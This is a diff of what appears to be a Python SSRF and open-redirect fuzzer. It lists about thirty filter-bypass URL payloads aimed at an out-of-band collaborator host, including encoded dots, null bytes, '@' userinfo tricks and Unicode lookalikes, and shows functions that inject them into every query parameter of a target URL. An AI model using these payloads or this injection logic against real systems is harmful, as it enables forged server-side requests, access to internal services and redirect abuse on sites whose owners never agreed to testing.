@@ -8,47 +8,53 @@ from furl import furl
 collaborator = 'https://ssrf.ragnarokv.site/'
 
 payloads = '''
-https://ssrf.ragnarokv.site
-//ssrf.ragnarokv.site
-///ssrf.ragnarokv.site
-\/\/ssrf.ragnarokv.site
-ssrf.ragnarokv%E3%80%82site
-@ssrf.ragnarokv.site
-http:http:ssrf.ragnarokv.site
-//ssrf.ragnarokv%00.site
-http:/ssrf.ragnarokv%252esite
-///[[domain]]@ssrf.ragnarokv.site
-https:ssrf.ragnarokv.site
-\/\/ssrf.ragnarokv.site
-/\/ssrf.ragnarokv.site
-////ssrf.ragnarokv%E3%80%82site
-//ssrf.ragnarokv.site
-///[[domain]]@ssrf.ragnarokv.site
-http:http://ssrf.ragnarokv.site
-//.@.@ssrf.ragnarokv.site
-https://[[domain]]@ssrf.ragnarokv.site
-https://ssrf.ragnarokv.c℀.[[domain]]
-https://[[domain]]%09.ssrf.ragnarokv.site
-https://ssrf.ragnarokv.siteğ.[[domain]]
-ssrf.ragnarokv.site%00.[[domain]]
-https://ssrf.ragnarokv.site%00.[[domain]]
-https://ssrf.ragnarokv.site%ff.[[domain]]
-ssrf.ragnarokv.site%ff@[[domain]]
-https://ssrf.ragnarokv.site%E3%80%82.[[domain]]
-https://@ssrf.ragnarokv.site\\@[[domain]]
-//%09/ssrf.ragnarokv.site
-////\;@ssrf.ragnarokv.site
-/https:ssrf.ragnarokv.site
+# https://ssrf.ragnarokv.site
+# //ssrf.ragnarokv.site
+# ///ssrf.ragnarokv.site
+# \/\/ssrf.ragnarokv.site
+# ssrf.ragnarokv%E3%80%82site
+# @ssrf.ragnarokv.site
+# http:http:ssrf.ragnarokv.site
+# //ssrf.ragnarokv%00.site
+# http:/ssrf.ragnarokv%252esite
+# ///[[domain]]@ssrf.ragnarokv.site
+# https:ssrf.ragnarokv.site
+# \/\/ssrf.ragnarokv.site
+# /\/ssrf.ragnarokv.site
+# ////ssrf.ragnarokv%E3%80%82site
+# //ssrf.ragnarokv.site
+# ///[[domain]]@ssrf.ragnarokv.site
+# http:http://ssrf.ragnarokv.site
+# //.@.@ssrf.ragnarokv.site
+# https://[[domain]]@ssrf.ragnarokv.site
+# https://ssrf.ragnarokv.c℀.[[domain]]
+# https://[[domain]]%09.ssrf.ragnarokv.site
+# https://ssrf.ragnarokv.siteğ.[[domain]]
+# ssrf.ragnarokv.site%00.[[domain]]
+# https://ssrf.ragnarokv.site%00.[[domain]]
+# https://ssrf.ragnarokv.site%ff.[[domain]]
+# ssrf.ragnarokv.site%ff@[[domain]]
+# https://ssrf.ragnarokv.site%E3%80%82.[[domain]]
+# https://@ssrf.ragnarokv.site\\@[[domain]]
+# //%09/ssrf.ragnarokv.site
+# ////\;@ssrf.ragnarokv.site
+# /https:ssrf.ragnarokv.site
 '''
 
 '''
 https://ssrf.ragnarokv.site\udfff@[[domain]]
 '''
 
+t_payloads = [
+    'https://ssrf.ragnarokv.site\\udfff@[[domain]]',
+]
+
 
 payloads = payloads.split('\n')
 payloads = filter(None, payloads)
 payloads = list(payloads)
+
+payloads =  payloads +  t_payloads
 
 # print(payloads)
 
@@ -62,12 +68,12 @@ def build_one_value(marker,payload,host):
 
 def process_onecopy(copy, param,payload):
     marker = copy.host + str(copy.path) + '/'+ param 
-    print('Inseted marker:             '+marker)
+    # print('Inseted marker:             '+marker)
     value = build_one_value(marker,payload,copy.host)
-    print('Inseted value:             '+value)
+    # print('Inseted value:             '+value)
     copy.args[param] = value
     # print('New Copy:           {}'.format(copy))
-    print('\n\n\n')
+    # print('\n\n\n')
     return copy 
 
 def process_url(url):
